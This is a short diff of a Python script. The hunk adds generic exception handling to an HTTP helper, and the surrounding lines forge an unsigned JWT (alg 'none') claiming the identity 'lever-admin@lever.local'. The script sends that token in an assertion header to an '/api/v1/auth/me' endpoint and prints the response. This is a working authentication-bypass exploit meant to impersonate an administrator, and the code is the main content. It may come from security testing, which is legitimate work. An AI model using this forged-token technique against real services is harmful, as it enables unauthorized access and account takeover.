@@ -316,6 +316,8 @@ def call(m, p, hdr, body=None):
         return urllib.request.urlopen(req, timeout=20).status
     except urllib.error.HTTPError as e:
         return e.code
+    except Exception as e:
+        return "error " + type(e).__name__
 b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
 forged = b({"alg": "none", "typ": "JWT"}) + "." + b({"email": "lever-admin@lever.local", "exp": 9999999999}) + "."
 print("forged", call("GET", "/api/v1/auth/me", {"X-Lever-Hub-Assertion": forged}))
